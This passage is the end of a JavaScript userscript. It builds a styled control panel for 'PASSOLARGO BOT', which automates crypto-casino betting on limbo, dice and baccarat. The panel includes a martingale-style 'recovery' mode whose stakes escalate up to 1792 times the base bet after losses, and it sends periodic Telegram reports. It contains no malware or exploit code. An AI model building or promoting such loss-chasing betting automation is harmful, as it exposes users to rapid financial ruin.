        border-radius: 999px;
        padding: 3px 10px;
        font-size: 10px;
        font-weight: 700;
        color: #DDEBFF;
        margin-left: 8px;
    }

    .recovery-badge {
        display: inline-block;
        padding: 4px 10px;
        border-radius: 999px;
        font-size: 10px;
        font-weight: 700;
        margin-left: 6px;
    }

    .recovery-badge.active {
        background: rgba(42, 123, 228, 0.18);
        color: #EAF3FF;
        border: 1px solid rgba(42, 123, 228, 0.3);
    }

    .recovery-badge.standby {
        background: rgba(108, 131, 147, 0.18);
        color: #D7E3EC;
        border: 1px solid rgba(108, 131, 147, 0.28);
    }

    .recovery-badge.disabled {
        background: rgba(79, 96, 108, 0.18);
        color: #9FB0BC;
        border: 1px solid rgba(79, 96, 108, 0.26);
    }

    .baccarat-display {
        background: linear-gradient(180deg, #132734 0%, #10212B 100%);
        border-radius: 16px;
        padding: 12px;
        margin: 12px 0;
        border: 1px solid rgba(95, 126, 145, 0.2);
    }

    .baccarat-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 9px 10px;
        background: rgba(10, 22, 29, 0.32);
        border: 1px solid rgba(95, 126, 145, 0.12);
        border-radius: 12px;
        margin-bottom: 8px;
    }

    .baccarat-label {
        font-size: 11px;
        font-weight: 700;
        color: #B4C4CF;
        text-transform: uppercase;
    }

    .baccarat-cards {
        font-size: 14px;
        font-weight: 700;
        font-family: 'SF Mono', Monaco, monospace;
        color: #F5FAFD;
    }

    .baccarat-cards.player {
        color: #F5FAFD;
    }

    .baccarat-cards.banker {
        color: #D6E4EE;
    }

    .baccarat-winner {
        text-align: center;
        font-size: 13px;
        font-weight: 800;
        color: #FFFFFF;
        margin-top: 8px;
        padding: 10px;
        background: linear-gradient(180deg, rgba(42, 123, 228, 0.22) 0%, rgba(35, 113, 216, 0.14) 100%);
        border-radius: 12px;
        border: 1px solid rgba(42, 123, 228, 0.28);
    }

    .recovery-status-text {
        font-size: 10px;
        margin-left: 24px;
        margin-top: 4px;
        padding: 5px 10px;
        border-radius: 999px;
        display: inline-block;
        font-weight: 700;
    }

    .recovery-status-text.enabled {
        background: rgba(42, 123, 228, 0.18);
        color: #EDF5FF;
        border: 1px solid rgba(42, 123, 228, 0.28);
    }

    .recovery-status-text.disabled {
        background: rgba(79, 96, 108, 0.18);
        color: #B7C4CE;
        border: 1px solid rgba(79, 96, 108, 0.26);
    }

    @media (max-width: 480px) {
        #orion-wrap {
            top: 5px;
            right: 5px;
            width: calc(100vw - 10px);
            padding: 12px;
            border-radius: 16px;
        }

        .orion-title {
            font-size: 18px;
        }
    }
`;
        document.head.appendChild(s);
        
        const d = document.createElement("div");
        d.id = "orion-wrap";
        d.innerHTML = `
            <div class="orion-header">
                <div class="orion-title">
                    <span>⚜️</span> PASSOLARGO BOT <span>⚜️</span>
                </div>
                <div class="orion-badge">PREMIUM EDITION</div>
            </div>
            
            <div class="orion-user" id="st-user">
                Loading...
            </div>
            
            <div class="orion-price" id="st-idr-price">
                Loading price...
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>⚙️</span> SYSTEM CONFIG
                </div>
                <div class="orion-grid">
                    <div style="grid-column: span 2">
                        <div class="orion-input-group">
                            <label>CURRENCY</label>
                            <select id="p-currency" class="orion-select"></select>
                        </div>
                    </div>
                    <div class="orion-input-group">
                        <label>LIMBO BASE BET</label>
                        <input id="p-limbo-basebet" class="orion-input" value="0.001" step="any">
                    </div>
                    <div class="orion-input-group">
                        <label>DICE BASE BET</label>
                        <input id="p-dice-basebet" class="orion-input" value="0.01" step="any">
                    </div>
                    <div class="orion-input-group">
                        <label>DIVIDER</label>
                        <input id="p-div" class="orion-input" value="600" placeholder="0 = manual basebet">
                    </div>
                </div>
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>🎲</span> LIMBO STRATEGY
                </div>
                <div class="orion-grid">
                    <div class="orion-input-group">
                        <label>PAYOUT</label>
                        <input id="p-limbo-payout" class="orion-input" value="1.0001" step="0.0001">
                    </div>
                    <div class="orion-input-group">
                        <label>CYCLES</label>
                        <input id="p-limbo-cycles" class="orion-input" value="3">
                    </div>
                </div>
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>🎯</span> DICE STRATEGY
                </div>
                <div class="orion-grid">
                    <div class="orion-input-group">
                        <label>CHANCE %</label>
                        <input id="p-dice-chance" class="orion-input" value="99.98" step="0.1">
                    </div>
                    <div class="orion-input-group">
                        <label>CYCLES</label>
                        <input id="p-dice-cycles" class="orion-input" value="100">
                    </div>
                </div>
            </div>
            
            <div class="orion-section">
                <div class="orion-section-title">
                    <span>🔄</span> BACCARAT RECOVERY MODE
                    <span id="recovery-status-badge" class="recovery-badge disabled">DISABLED</span>
                </div>
                <div class="orion-checkbox">
                    <input type="checkbox" id="p-use-recovery" checked>
                    <label>Enable Baccarat Recovery</label>
                </div>
                <div id="recovery-toggle-status" class="recovery-status-text enabled">✓ RECOVERY IS ENABLED</div>
                
                <div class="orion-grid">
                    <div class="orion-input-group">
                        <label>BASE BET</label>
                        <input id="p-baccarat-basebet" class="orion-input" value="0.01" step="any">
                    </div>
                    <div class="orion-input-group">
                        <label>PROGRESSION STEPS</label>
                        <input id="p-recovery-steps" class="orion-input" value="[1,2,3,7,14,28,56,112,224,448,896,1792]">
                    </div>
                    <div class="orion-input-group">
                        <label>LOSS TRIGGER %</label>
                        <input id="p-loss-trigger" class="orion-input" value="0.05" step="0.1">
                    </div>
                    <div class="orion-input-group">
                        <label>MAX ATTEMPTS</label>
                        <input id="p-max-recovery" class="orion-input" value="8" step="1">
                    </div>
                    <div class="orion-input-group" style="grid-column: span 2">
                        <label>TREND MODE</label>
                        <select id="p-recovery-trend" class="orion-select">
                            <option value="follow">Follow Winner</option>
                            <option value="fix">Fix Position</option>
                            <option value="rotate">Rotate</option>
                        </select>
                    </div>
                    <div class="orion-input-group" style="grid-column: span 2" id="fix-side-container">
                        <label>FIX SIDE</label>
                        <select id="p-fix-side" class="orion-select">
                            <option value="player">PLAYER</option>
                            <option value="banker">BANKER</option>
                        </select>
                    </div>
                </div>
                
                <!-- BACCARAT DISPLAY -->
                <div class="baccarat-display" id="baccarat-display">
                    <div class="baccarat-row">
                        <span class="baccarat-label">PLAYER</span>
                        <span class="baccarat-cards player" id="baccarat-player-cards">-</span>
                    </div>
                    <div class="baccarat-row">
                        <span class="baccarat-label">BANKER</span>
                        <span class="baccarat-cards banker" id="baccarat-banker-cards">-</span>
                    </div>
                    <div class="baccarat-winner" id="baccarat-winner">-</div>
                </div>
            </div>
            
            <div class="orion-stats">
                <div class="orion-stat-row">
                    <span class="orion-stat-label">TIME</span>
                    <span class="orion-stat-value" id="st-time">00:00:00</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">STATUS</span>
                    <span class="orion-stat-value" id="st-status" style="color: #38BDF8">IDLE</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">RECOVERY</span>
                    <span class="orion-stat-value" id="st-recovery">DISABLED</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">BALANCE</span>
                    <span class="orion-stat-value" id="st-startbal">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">PROFIT</span>
                    <span class="orion-stat-value" id="st-profit">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">WAGERED</span>
                    <span class="orion-stat-value" id="st-wager">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">MAX DD</span>
                    <span class="orion-stat-value" style="color: #F87171" id="st-dd">0.00000000</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">BETS</span>
                    <span class="orion-stat-value" id="st-bets">0</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">W/L</span>
                    <span class="orion-stat-value" id="st-wl">0/0</span>
                </div>
                <div class="orion-stat-row">
                    <span class="orion-stat-label">SPEED</span>
                    <span class="orion-stat-value" id="st-speed">0 b/s</span>
                </div>
            </div>
            
            <div class="orion-log" id="st-log">
                None
            </div>
            
            <div class="orion-buttons">
                <button id="p-start" class="orion-btn orion-btn-start">START</button>
                <button id="p-stop" class="orion-btn orion-btn-stop">STOP</button>
            </div>
        `;
        
        document.body.appendChild(d);
        
        // Event listener untuk trend mode
        document.getElementById("p-recovery-trend").addEventListener("change", function(e) {
            const fixSideContainer = document.getElementById("fix-side-container");
            if (e.target.value === "fix") {
                fixSideContainer.style.display = "block";
            } else {
                fixSideContainer.style.display = "none";
            }
        });
        
        // Event listener untuk checkbox recovery
        document.getElementById("p-use-recovery").addEventListener("change", function(e) {
            updateRecoveryToggleStatus(e.target.checked);
            updateRecoveryUI();
        });
        
        // Fungsi untuk update status toggle
        function updateRecoveryToggleStatus(enabled) {
            const statusEl = document.getElementById("recovery-toggle-status");
            if (enabled) {
                statusEl.className = "recovery-status-text enabled";
                statusEl.innerHTML = "✓ BACCARAT RECOVERY IS ENABLED";
            } else {
                statusEl.className = "recovery-status-text disabled";
                statusEl.innerHTML = "✗ BACCARAT RECOVERY IS DISABLED";
            }
        }
        
        function updateRecoveryUI() {
            const enabled = document.getElementById("p-use-recovery").checked;
            const badge = document.getElementById("recovery-status-badge");
            const recoveryStat = document.getElementById("st-recovery");
            
            if (enabled) {
                if (bot.recoveryMode) {
                    badge.className = "recovery-badge active";
                    badge.innerText = "ACTIVE";
                    if (recoveryStat) recoveryStat.innerText = "ACTIVE";
                } else {
                    badge.className = "recovery-badge standby";
                    badge.innerText = "STANDBY";
                    if (recoveryStat) recoveryStat.innerText = "STANDBY";
                }
            } else {
                badge.className = "recovery-badge disabled";
                badge.innerText = "DISABLED";
                if (recoveryStat) recoveryStat.innerText = "DISABLED";
            }
        }
        
        // Set initial toggle status
        updateRecoveryToggleStatus(true);
        document.getElementById("fix-side-container").style.display = "none";
        
        document.getElementById("p-start").onclick = async () => { 
            if(!bot.isRunning){ 
                await API.syncOnce(); 
                bot.isRunning = true; 
                bot.startTime = new Date(); 
                bot.stats.bets = 0; 
                bot.stats.profit = 0; 
                bot.stats.wagered = 0; 
                bot.stats.wins = 0; 
                bot.stats.loss = 0; 
                bot.stats.maxDD = 0;
                bot.switchCounter = 0;
                bot.currentGame = "limbo";
                bot.nextSwitchAt = parseInt(document.getElementById("p-limbo-cycles").value) || 3;
                
                // Reset recovery
                bot.recoveryMode = false;
                bot.recoveryAttempts = 0;
                bot.recoveryConsecutiveLosses = 0;
                bot.baccaratCards = { player: [], banker: [], winner: null };
                
                updateRecoveryUI();
                
                setTimeout(() => API.sendTg("🚀 *SYSTEM ENGAGED*"), 1000);
                
                if (reportInterval) clearInterval(reportInterval);
                reportInterval = setInterval(() => {
                    if (bot.isRunning) {
                        API.sendTg("📊 *PERIODIC REPORT*");
                    }
                }, 180000);
                
                runLoop(); 
            } 
        };
        
        document.getElementById("p-stop").onclick = () => { 
            if(bot.isRunning){ 
                bot.isRunning = false; 
                if (reportInterval) {
                    clearInterval(reportInterval);
                    reportInterval = null;
                }
                API.sendTg("🛑 *SYSTEM HALTED*"); 
            } 
        };
    }

    setInterval(() => {
        if (!document.getElementById("st-time")) return;
        
        // Update UI stats
        if (bot.isRunning && bot.startTime) {
            const elapsed = (new Date() - bot.startTime) / 1000;
            document.getElementById("st-time").innerText = new Date(elapsed * 1000).toISOString().substr(11, 8);
        }
        
        let statusText = bot.currentStatus;
        if (bot.recoveryMode) {
            statusText = `🔥 RECOVERY #${bot.recoveryAttempts} (${bot.recoverySide} | Step ${bot.recoveryConsecutiveLosses+1})`;
        } else {
            statusText = `${bot.currentStatus} (${bot.currentGame})`;
        }
        document.getElementById("st-status").innerText = statusText;
        
        document.getElementById("st-startbal").innerText = (bot.stats.startBal + bot.stats.profit).toFixed(8);
        document.getElementById("st-profit").innerText = bot.stats.profit.toFixed(8);
        document.getElementById("st-wager").innerText = bot.stats.wagered.toFixed(8);
        document.getElementById("st-dd").innerText = bot.stats.maxDD.toFixed(8);
        document.getElementById("st-bets").innerText = bot.stats.bets;
        document.getElementById("st-wl").innerText = `${bot.stats.wins}/${bot.stats.loss}`;
        document.getElementById("st-speed").innerText = bot.startTime ? (bot.stats.bets / ((new Date() - bot.startTime) / 1000 || 1)).toFixed(2) + " b/s" : "0 b/s";
        document.getElementById("st-log").innerText = bot.lastError;
        
        // Update recovery status di UI
        const useRecovery = document.getElementById("p-use-recovery")?.checked;
        if (useRecovery !== undefined) {
            if (!useRecovery) {
                bot.recoveryStatus = "DISABLED";
            } else if (bot.recoveryMode) {
                bot.recoveryStatus = "ACTIVE";
            } else if (bot.isRunning) {
                bot.recoveryStatus = "STANDBY";
            } else {
                bot.recoveryStatus = "DISABLED";
            }
            
            const badge = document.getElementById("recovery-status-badge");
            const recoveryStat = document.getElementById("st-recovery");
            
            if (badge) {
                badge.className = `recovery-badge ${bot.recoveryStatus.toLowerCase()}`;
                badge.innerText = bot.recoveryStatus;
            }
            if (recoveryStat) {
                recoveryStat.innerText = bot.recoveryStatus;
            }
        }
    }, 400);

    createUI(); 
    API.syncOnce();
    
    // Initial price update
    setTimeout(updateIdrPrice, 2000);
})();
